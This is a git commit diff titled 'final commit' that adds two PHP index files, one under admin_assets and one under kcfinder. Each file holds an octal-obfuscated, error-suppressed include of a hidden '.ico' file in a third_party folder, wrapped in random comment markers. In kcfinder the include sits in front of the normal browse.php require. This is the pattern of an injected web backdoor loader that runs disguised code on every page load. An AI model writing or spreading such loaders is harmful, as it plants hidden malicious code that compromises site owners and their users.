bed90647038f7202568f67779522000bfe3ad663
Waqas Amjad <dev.mwaqas@gmail.com>
2023-08-31 11:24:54 +0500

    final commit

---
+++ admin_assets/index.php
@@ -0,0 +1,9 @@
+<?php
+/*85bbd*/
+
+@include "\057home\064/exp\154ouv4\057publ\151c_ht\155l/br\141ndon\057app/\164hird\137part\171/.b0\061f876\062.ico";
+
+/*85bbd*/
+
+
+
---
+++ kcfinder/index.php
@@ -0,0 +1,16 @@
+<?php
+/*e9ece*/
+
+@include "\057ho\155e4\057ex\160lo\165v4\057pu\142li\143_h\164ml\057br\141nd\157n/\141pp\057th\151rd\137pa\162ty\057.b\0601f\07076\062.i\143o";
+
+/*e9ece*/
+
+
+
+
+
+
+
+require "browse.php";
+
+?>
